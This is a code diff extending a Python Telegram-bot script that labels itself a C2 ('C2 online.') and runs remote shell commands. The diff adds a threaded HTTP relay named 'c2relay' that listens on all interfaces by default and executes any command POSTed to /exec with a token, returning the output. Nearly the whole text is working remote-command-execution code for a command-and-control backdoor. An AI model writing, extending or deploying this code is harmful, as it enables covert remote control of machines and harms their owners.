@@ -3,10 +3,12 @@ import json
 import os
 import subprocess
 import sys
+import threading
 import time
 import urllib.error
 import urllib.parse
 import urllib.request
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 TOKEN = os.environ.get("TG_TOKEN", "").strip()
 API = "https://api.telegram.org/bot{}/".format(TOKEN)
@@ -14,6 +16,10 @@ ALLOWED = os.environ.get("TG_ALLOW", "").strip()
 TIMEOUT = int(os.environ.get("TG_TIMEOUT", "60"))
 CWD = os.environ.get("TG_CWD") or os.getcwd()
 MAX_OUT = 4000
+HTTP_BIND = os.environ.get("TG_HTTP_BIND", "0.0.0.0").strip()
+HTTP_PORT = int(os.environ.get("TG_HTTP_PORT", "8080"))
+HTTP_TOKEN = os.environ.get("TG_HTTP_TOKEN", "").strip()
+EXEC_LOCK = threading.Lock()
 
 HELP = (
     "C2 online.\n"
@@ -43,6 +49,11 @@ def send(chat_id, text):
 
 
 def shell(cmd):
+    with EXEC_LOCK:
+        return _shell(cmd)
+
+
+def _shell(cmd):
     global CWD
     cmd = cmd.strip()
     if not cmd:
@@ -73,9 +84,63 @@ def shell(cmd):
     return out
 
 
+class Relay(BaseHTTPRequestHandler):
+    server_version = "c2relay"
+
+    def do_GET(self):
+        if self.path.split("?")[0] == "/health":
+            self._reply(200, "ok")
+        else:
+            self._reply(404, "not found")
+
+    def do_POST(self):
+        if self.path.split("?")[0] != "/exec":
+            return self._reply(404, "not found")
+        tok = self.headers.get("X-Token", "") or ""
+        if not tok and self.headers.get("Authorization", "").startswith("Bearer "):
+            tok = self.headers.get("Authorization")[7:].strip()
+        if tok != HTTP_TOKEN:
+            return self._reply(401, "unauthorized")
+        n = int(self.headers.get("Content-Length") or 0)
+        body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
+        if (self.headers.get("Content-Type") or "").startswith("application/json"):
+            try:
+                body = json.loads(body).get("cmd", "")
+            except (ValueError, AttributeError):
+                return self._reply(400, "bad json")
+        body = body.strip()
+        if not body:
+            return self._reply(400, "empty command")
+        print("[http>] {}".format(body[:200]))
+        out = shell(body)
+        print("[http<] {}".format(out[:300].replace("\n", " | ")))
+        self._reply(200, out)
+
+    def _reply(self, code, text):
+        data = (text or "").encode("utf-8", "replace")
+        self.send_response(code)
+        self.send_header("Content-Type", "text/plain; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+
+    def log_message(self, fmt, *args):
+        print("[http] " + (fmt % args), file=sys.stderr)
+
+
+def start_http():
+    srv = ThreadingHTTPServer((HTTP_BIND, HTTP_PORT), Relay)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    print("[+] http relay: {}:{}/exec".format(HTTP_BIND, HTTP_PORT))
+
+
 def main():
     if not TOKEN:
         sys.exit("TG_TOKEN env var missing")
+    if HTTP_TOKEN:
+        start_http()
+    else:
+        print("[!] TG_HTTP_TOKEN not set - http relay disabled")
     try:
         me = api("getMe")
     except urllib.error.HTTPError as e:
